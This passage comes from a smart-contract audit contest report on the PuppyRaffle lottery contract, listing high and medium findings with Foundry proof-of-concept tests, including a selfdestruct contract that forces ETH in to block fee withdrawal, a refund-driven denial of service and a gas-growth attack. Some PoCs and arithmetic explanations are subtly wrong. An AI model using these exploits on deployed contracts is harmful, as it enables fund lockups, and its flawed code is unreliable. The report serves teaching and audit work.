[Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [innertia](/profile/clkqyrmqu000gkz08274w833n), [WangAudit](/profile/clnxia5yx0006ju08lkeccntm), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [0xlemon](/profile/clk70p00n000gl5082o0iufja), [Equious](/profile/clldzdkk60000mr082grbuj97), [cromewar](/profile/cljys3m0o0000ky08fun4ch8i), [Louis](/profile/clloixi3x0000la08i46r5hc8), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [jasmine](/profile/clkarmt9n0000l908usstgujw), [Heba](/profile/clo3cb5nv000mmj087plzmqy8), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [0x0bserver](/profile/clo5ejc7k0000k108dnby2kir). Selected submission by: [Maroutis](/profile/clkctygft000il9088nkvgyqk)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L103

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L131

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L153

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L151C9-L151C61

## Summary

`PuppyRaffle::refund` is supposed to refund a player and remove him from the current players. But instead, it replaces his index value with address(0) which is considered a valid value by solidity. This can cause a lot issues because the players array length is unchanged and address(0) is now considered a player.

## Vulnerability Details
```javascript
players[playerIndex] = address(0);

@> uint256 totalAmountCollected = players.length * entranceFee;
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);
```
If a player refunds his position, the function `PuppyRaffle::selectWinner` will always revert. Because more than likely the following call will not work because the `prizePool` is based on a amount calculated by considering that that no player has refunded his position and exit the lottery. And it will try to send more tokens that what the contract has :
```javascript
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;

(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

However, even if this calls passes for some reason (maby there are more native tokens that what the players have sent or because of the 80% ...). The call will thankfully still fail because of the following line is minting to the zero address is not allowed.
```javascript
 _safeMint(winner, tokenId);
```

## Impact

The lottery is stoped, any call to the function `PuppyRaffle::selectWinner`will revert. There is no actual loss of funds for users as they can always refund and get their tokens back. However, the protocol is shut down and will lose all it's customers. A core functionality is exposed. Impact is high


### Proof of concept
To execute this test : forge test --mt testWinnerSelectionRevertsAfterExit -vvvv

```javascript
function testWinnerSelectionRevertsAfterExit() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        
        // There are four winners. Winner is last slot
        vm.prank(playerFour);
        puppyRaffle.refund(3);

        // reverts because out of Funds
        vm.expectRevert();
        puppyRaffle.selectWinner();

        vm.deal(address(puppyRaffle), 10 ether);
        vm.expectRevert("ERC721: mint to the zero address");
        puppyRaffle.selectWinner();

    }
```

## Tools Used
- foundry

## Recommendations
Delete the player index that has refunded.

```diff
-   players[playerIndex] = address(0);

+    players[playerIndex] = players[players.length - 1];
+    players.pop()
```

## <a id='H-05'></a>H-05. Typecasting from uint256 to uint64 in PuppyRaffle.selectWinner() May Lead to Overflow and Incorrect Fee Calculation

_Submitted by [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [cem](/profile/clkb9m88m0004l9082ly4fz49), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [zadev](/profile/clo4l66aa0000md08lazlawbn), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [Y403L](/profile/clk451ae6001gl908aibvhwv9), [Dan](/profile/clo60kl0m004tma08kr2wvlrx), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [ironside](/profile/clnu03xlr0000mp08r7fms6nl), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [innertia](/profile/clkqyrmqu000gkz08274w833n), [sh0lt0](/profile/clnw2tusk000rle08fcuompr0), [00decree](/profile/clnge53mh0000jv08gajav1nt), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [Louis](/profile/clloixi3x0000la08i46r5hc8), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Chput](/profile/clo4mhw7q0006mm08j385wf5r). Selected submission by: [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L134

## Summary


## Vulnerability Details
The type conversion from uint256 to uint64 in the expression 'totalFees = totalFees + uint64(fee)' may potentially cause overflow problems if the 'fee' exceeds the maximum value that a uint64 can accommodate (2^64 - 1).
```javascript
        totalFees = totalFees + uint64(fee);
```

## POC
<details>
<summary>Code</summary>

```javascript
function testOverflow() public {
        uint256 initialBalance = address(puppyRaffle).balance;

        // This value is greater than the maximum value a uint64 can hold
        uint256 fee = 2**64; 

        // Send ether to the contract
        (bool success, ) = address(puppyRaffle).call{value: fee}("");
        assertTrue(success);

        uint256 finalBalance = address(puppyRaffle).balance;

        // Check if the contract's balance increased by the expected amount
        assertEq(finalBalance, initialBalance + fee);
    }
```
</details>

In this test, assertTrue(success) checks if the ether was successfully sent to the contract, and assertEq(finalBalance, initialBalance + fee) checks if the contract's balance increased by the expected amount. If the balance didn't increase as expected, it could indicate an overflow.

## Impact
This could consequently lead to inaccuracies in the computation of 'totalFees'. 
## Tools Used
Manual
## Recommendations
To resolve this issue, you should change the data type of `totalFees` from `uint64` to `uint256`. This will prevent any potential overflow issues, as `uint256` can accommodate much larger numbers than `uint64`. Here's how you can do it:

Change the declaration of `totalFees` from:
```javascript
uint64 public totalFees = 0;
```
to:
```jasvascript
uint256 public totalFees = 0;
```
And update the line where `totalFees` is updated from:
```diff
- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;

```
This way, you ensure that the data types are consistent and can handle the range of values that your contract may encounter.
## <a id='H-06'></a>H-06. Overflow/Underflow vulnerabilty for any version before 0.8.0

_Submitted by [0xbjorn](/profile/clnxo3ksf0000l508i9e2vtom), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [nisedo](/profile/clk3saar60000l608gsamuvnw), [tinotendajoe01](/profile/clk4aef91000sld08c1vav7px), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [n4thedev01](/profile/clnybjmgf0001l708j472drqp), [Dan](/profile/clo60kl0m004tma08kr2wvlrx), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [Chandr](/profile/clka007jd0000k2086j3juoi9), [AzmaeenGH](/profile/clk6y22wr000yl7088q435slg), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo), [zuhaibmohd](/profile/clk9l0cjq000iih08gux5zwob), [0xtekt](/profile/clodvp9c7000kjz08cxddlj4r), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [stakog](/profile/clmqkms6k0004mn08mbsf2p7f), [IceBear](/profile/cllnrqkdu0008lc08luxl02vh), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [SecurityDev23](/profile/clk46s8m10022la08qgfsxkfu), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [sh0lt0](/profile/clnw2tusk000rle08fcuompr0), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [00decree](/profile/clnge53mh0000jv08gajav1nt), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [Chput](/profile/clo4mhw7q0006mm08j385wf5r). Selected submission by: [AzmaeenGH](/profile/clk6y22wr000yl7088q435slg)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L80

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L131C1-L134C45

## Summary
The PuppyRaffle.sol uses Solidity compiler version 0.7.6. Any Solidity version before 0.8.0 is prone to Overflow/Underflow vulnerability. Short example - a `uint8 x;` can hold 256 values (from 0 - 255). If the calculation results in `x` variable to get 260 as value, the extra part will overflow and we will end up with 5 as a result instead of the expected 260 (because 260-255 = 5).

## Vulnerability Details
I have two example below to demonstrate the problem of overflow and underflow with versions before 0.8.0, and how to fix it using safemath:

Without `SafeMath`:
```
function withoutSafeMath() external pure returns (uint256 fee){
    uint8 totalAmountCollected = 20;
    fee = (totalAmountCollected * 20) / 100;
    return fee;
}
// fee: 1
// WRONG!!!
```
In the above code,`without safeMath`, 20x20 (totalAmountCollected * 20) was 400, but 400 is beyond the limit of uint8, so after going to 255, it went back to 0 and started counting from there. So, 400-255 = 145. 145 was the result of 20x20 in this code. And after dividing it by 100, we got 1.45, which the code showed as 1.


With `SafeMath`:
```
function withSafeMath() external pure returns (uint256 fee){
    uint8 totalAmountCollected = 20;
    fee =  totalAmountCollected.mul(20).div(100);
    return fee;
}
//  fee: 4
//  CORRECT!!!!
```
This code didnt suffer from Overflow problem. Because of the safeMath, it was able to calculate 20x20 as 400, and then divided it by 100, to get 4 as result.



## Impact
Depending on the bits assigned to a variable, and depending on whether the value assigned goes above or below a certain threshold, the code could end up giving unexpected results.
This unexpected OVERFLOW and UNDERFLOW will result in unexpected and wrong calculations, which in turn will result in wrong data being used and presented to the users. 

## Tools Used
Got suggestions from AI tool phind. Tested the above code (with and without safeMath) on remix.ethereum.org

## Recommendations
Modify the code to include SafeMath:

1. First import SafeMath from openzeppelin:
```
import "@openzeppelin/contracts/math/SafeMath.sol";
```
2. then add the following line, inside PuppyRaffle Contract:
```
using SafeMath for uint256;
```
(can also add safemath for uint8, uint16, etc as per need)


3. Then modify the `require` inside `enterRaffle() function`:

```diff
- require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
+ uint256 totalEntranceFee = newPlayers.length.mul(entranceFee);
+ require(msg.value == totalEntranceFee, "PuppyRaffle: Must send enough to enter raffle");
```

3. Then modify variables (`totalAmountCollected`, `prizePool`, `fee`, and `totalFees`) inside `selectWinner()` function:

```diff
- uint256 totalAmountCollected = players.length * entranceFee;
+ uint256 totalAmountCollected = players.length.mul(entranceFee);

- uint256 prizePool = (totalAmountCollected * 80) / 100;
+ uint256 prizePool = totalAmountCollected.mul(80).div(100);

- uint256 fee = (totalAmountCollected * 20) / 100;
+ uint256 fee = totalAmountCollected.mul(20).div(100);

- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees.add(fee);
```
This way, the code is now safe from Overflow/Underflow vulnerabilities.
## <a id='H-07'></a>H-07. Potential Front-Running Attack in `selectWinner` and `refund` Functions

_Submitted by [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [nisedo](/profile/clk3saar60000l608gsamuvnw), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [ezerez](/profile/clnueax9c000ll408f0qz7sa2). Selected submission by: [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blame/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L125

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blame/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L96


## Summary
Malicious actors can watch any `selectWinner` transaction and front-run it with a transaction that calls `refund` to avoid participating in the raffle if he/she is not the winner or even to steal the owner fess utilizing the current calculation of the `totalAmountCollected` variable in the `selectWinner` function. 


## Vulnerability Details
The PuppyRaffle smart contract is vulnerable to potential front-running attacks in both the `selectWinner` and `refund` functions. Malicious actors can monitor transactions involving the `selectWinner` function and front-run them by submitting a transaction calling the `refund` function just before or after the `selectWinner` transaction. This malicious behavior can be leveraged to exploit the raffle in various ways. Specifically, attackers can:

1. **Attempt to Avoid Participation:** If the attacker is not the intended winner, they can call the `refund` function before the legitimate winner is selected. This refunds the attacker's entrance fee, allowing them to avoid participating in the raffle and effectively nullifying their loss.

2. **Steal Owner Fees:** Exploiting the current calculation of the `totalAmountCollected` variable in the `selectWinner` function, attackers can execute a front-running transaction, manipulating the prize pool to favor themselves. This can result in the attacker claiming more funds than intended, potentially stealing the owner's fees (`totalFees`).

## Impact

- **Medium:** The potential front-running attack might lead to undesirable outcomes, including avoiding participation in the raffle and stealing the owner's fees (`totalFees`). These actions can result in significant financial losses and unfair manipulation of the contract.

## Tools Used
- Manual review of the smart contract code.

## Recommendations
To mitigate the potential front-running attacks and enhance the security of the PuppyRaffle contract, consider the following recommendations:

- Implement Transaction ordering dependence (TOD) to prevent front-running attacks. This can be achieved by applying time locks in which participants can only call the `refund` function after a certain period of time has passed since the `selectWinner` function was called. This would prevent attackers from front-running the `selectWinner` function and calling the `refund` function before the legitimate winner is selected.

# Medium Risk Findings

## <a id='M-01'></a>M-01. `PuppyRaffle: enterRaffle` Use of gas extensive duplicate check leads to Denial of Service, making subsequent participants to spend much more gas than prev ones to enter

_Submitted by [philfr](/profile/cln48o0rf0000mn08fc6i734d), [zadev](/profile/clo4l66aa0000md08lazlawbn), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [funkornaut](/profile/clk4161cu0030mb08pybakf1m), [cem](/profile/clkb9m88m0004l9082ly4fz49), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [0xdark1337](/profile/clmfo5uje0000mg08bvvwu65u), [C0D30](/profile/clnjbh3c10000l7086io4m3vl), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [ret2basic](/profile/clk3swm9u000sl508pi6dlf3f), [tinotendajoe01](/profile/clk4aef91000sld08c1vav7px), [nisedo](/profile/clk3saar60000l608gsamuvnw), [Luka](/profile/clnuevrco000ul408x4ihghzy), [Eric](/profile/clkbqsa510000mi082he56qby), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u), [securityFullCourse](/profile/cloako3fo0000l707y4nktwgi), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [mahivasisth](/profile/clk86z1bk000olh08he15prja), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [danlipert](/profile/clnykqixa0000mf08qa9u8qoz), [Chandr](/profile/clka007jd0000k2086j3juoi9), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [Kelvineth](/profile/clkaa82lg0000l308jv5dbr1o), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [slasheur](/profile/clnvgvxwk000el1087juqjdjz), [0xtekt](/profile/clodvp9c7000kjz08cxddlj4r), [0xanmol](/profile/clkp3qzse000yl508z8ia3dby), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [yeahChibyke](/profile/clk40bik4000wjl087tjqrtti), [0xspryon](/profile/clo19fw280000mf08c4yazene), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [zen4269](/profile/clnuh6eoq0012l408590tbzrz), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [dougo](/profile/clnvz1v7u0000mg07ikf4cqcd), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [0xKriLuv](/profile/clo4gftul0016jv08pfpi5md6), [Damilare](/profile/clo459tih000imk08i8q3oy47), [contractsecure](/profile/clk3y89700004jq08hsxugo8k), [dcheng](/profile/clnw5u1te0006l708th66izul), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [SecurityDev23](/profile/clk46s8m10022la08qgfsxkfu), [Omeguhh](/profile/clkvbx923003kl008u2lvm36y), [MikeDougherty](/profile/clnuc4zbb000cl508b6gnobqi), [nervouspika](/profile/clk8s260t000el108iz3yrkhy), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [sh0lt0](/profile/clnw2tusk000rle08fcuompr0), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [EngrPips](/profile/clllaqpwa0000ld08rkvlimu8), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [cromewar](/profile/cljys3m0o0000ky08fun4ch8i), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [0xhashiman](/profile/clofddxp4001ijz08hm9txokv), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [0xjarix](/profile/clmjdxnit0000mo08j0t9g44h), [0x0bserver](/profile/clo5ejc7k0000k108dnby2kir), [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh). Selected submission by: [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#79-92

## Summary
`enterRaffle` function uses gas inefficient duplicate check that causes leads to Denial of Service, making subsequent participants to spend much more gas than previous users to enter.
## Vulnerability Details
In the `enterRaffle` function, to check duplicates, it loops through the `players` array.  As the `player` array grows, it will make more checks, which leads the later user to pay more gas than the earlier one. More users in the Raffle, more checks a user have to make leads to pay more gas.

## Impact
As the arrays grows significantly over time, it will make the function unusable due to block gas limit. This is not a fair approach and lead to bad user experience.

## POC
In existing test suit, add this test to see the difference b/w gas for users.
once added run `forge test --match-test testEnterRaffleIsGasInefficient -vvvvv` in terminal. you will be able to see logs in terminal.
```solidity
function testEnterRaffleIsGasInefficient() public {
  vm.startPrank(owner);
  vm.txGasPrice(1);
 
  /// First we enter 100 participants
  uint256 firstBatch = 100;
  address[] memory firstBatchPlayers = new address[](firstBatch);
  for(uint256 i = 0; i < firstBatchPlayers; i++) {
    firstBatch[i] = address(i);
  }

  uint256 gasStart = gasleft();
  puppyRaffle.enterRaffle{value: entranceFee * firstBatch}(firstBatchPlayers);
  uint256 gasEnd = gasleft();
  uint256 gasUsedForFirstBatch = (gasStart - gasEnd) * txPrice;
  console.log("Gas cost of the first 100 partipants is:", gasUsedForFirstBatch);

  /// Now we enter 100 more participants
  uint256 secondBatch = 200;
  address[] memory secondBatchPlayers = new address[](secondBatch);
  for(uint256 i = 100; i < secondBatchPlayers; i++) {
    secondBatch[i] = address(i);
  }
  
  gasStart = gasleft();
  puppyRaffle.enterRaffle{value: entranceFee * secondBatch}(secondBatchPlayers);
  gasEnd = gasleft();
  uint256 gasUsedForSecondBatch = (gasStart - gasEnd) * txPrice;
  console.log("Gas cost of the next 100 participant is:", gasUsedForSecondBatch);
  vm.stopPrank(owner);

}
```
## Tools Used
Manual Review, Foundry
## Recommendations
Here are some of recommendations, any one of that can be used to mitigate this risk.

1. User a mapping to check duplicates. For this approach you to declare a variable `uint256 raffleID`, that way each raffle will have unique id. Add a mapping from player address to raffle id  to keep of users for particular round.

```diff
+ uint256 public raffleID;
+ mapping (address => uint256) public usersToRaffleId;
.
.
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

        for (uint256 i = 0; i < newPlayers.length; i++) {
+           // Check for duplicates
+           require(usersToRaffleId[newPlayers[i]] != raffleID, "PuppyRaffle: Already a participant");

            players.push(newPlayers[i]);
+           usersToRaffleId[newPlayers[i]] = raffleID;
        }

-       // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }

        emit RaffleEnter(newPlayers);
    }
.
.
.

function selectWinner() external {
        //Existing code
+    raffleID = raffleID + 1;        
    }
```

2. Allow duplicates participants, As technically you can't stop people participants more than once. As players can use new address to enter.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }

        emit RaffleEnter(newPlayers);
    }
```
## <a id='M-02'></a>M-02. Slightly increasing puppyraffle's contract balance will render `withdrawFees` function useless

_Submitted by [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [whiteh4t9527](/profile/clo5gva7c000qju08mwizp15i), [zach030](/profile/clllg9trq0002ml0881bhkegb), [cem](/profile/clkb9m88m0004l9082ly4fz49), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [Zac369](/profile/clk5png2a0000l809z7kt06dn), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [Cosine](/profile/clkc7trh30004l208e0okerdn), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [zadev](/profile/clo4l66aa0000md08lazlawbn), [eeshenggoh](/profile/clmlj6skc0000ml084rcney77), [ret2basic](/profile/clk3swm9u000sl508pi6dlf3f), [ThermoHash](/profile/clk89rwlt0000mr09jtlo75v6), [nisedo](/profile/clk3saar60000l608gsamuvnw), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [Eric](/profile/clkbqsa510000mi082he56qby), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u), [0xSimeon](/profile/clk4oou2i0000l808pkf7krr7), [n4thedev01](/profile/clnybjmgf0001l708j472drqp), [Luka](/profile/clnuevrco000ul408x4ihghzy), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Chandr](/profile/clka007jd0000k2086j3juoi9), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [0xfuluz](/profile/clnzti7fb0006mf084zv1nm96), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [intellygentle](/profile/clnur0zc30005l308rt7rewm9), [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [0xtekt](/profile/clodvp9c7000kjz08cxddlj4r), [zuhaibmohd](/profile/clk9l0cjq000iih08gux5zwob), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [0xspryon](/profile/clo19fw280000mf08c4yazene), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [0xdangit](/profile/clnui7kb50000mi080ap2y4t5), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [kumar](/profile/cloeizs9m000ujs088lb7pvj2), [sm4rty](/profile/clk4170ln003amb088n137st7), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [theinstructor](/profile/clnvsrne1001ymh08z4oz4pq9), [dcheng](/profile/clnw5u1te0006l708th66izul), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [Omeguhh](/profile/clkvbx923003kl008u2lvm36y), [yeahChibyke](/profile/clk40bik4000wjl087tjqrtti), [innertia](/profile/clkqyrmqu000gkz08274w833n), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [Awacs](/profile/clo47qxsq001dm808b0vjbta1), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [00decree](/profile/clnge53mh0000jv08gajav1nt), [0xAbhay](/profile/clnwpdjb00006jr088q416aog), [Equious](/profile/clldzdkk60000mr082grbuj97), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [Louis](/profile/clloixi3x0000la08i46r5hc8), [slasheur](/profile/clnvgvxwk000el1087juqjdjz). Selected submission by: [InAllHonesty](/profile/clkgm90b9000gms085g528phk)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L157-L163

## Summary

An attacker can slightly change the eth balance of the contract to break the `withdrawFees` function.

## Vulnerability Details

The withdraw function contains the following check:
```
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
Using `address(this).balance` in this way invites attackers to modify said balance in order to make this check fail. This can be easily done as follows:

Add this contract above `PuppyRaffleTest`:
```
contract Kill {
    constructor  (address target) payable {
        address payable _target = payable(target);
        selfdestruct(_target);
    }
}
```
Modify `setUp` as follows:
```
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        address mAlice = makeAddr("mAlice");
        vm.deal(mAlice, 1 ether);
        vm.startPrank(mAlice);
        Kill kill = new Kill{value: 0.01 ether}(address(puppyRaffle));
        vm.stopPrank();
    }
```
Now run `testWithdrawFees()` - ` forge test --mt testWithdrawFees` to get:
```
Running 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
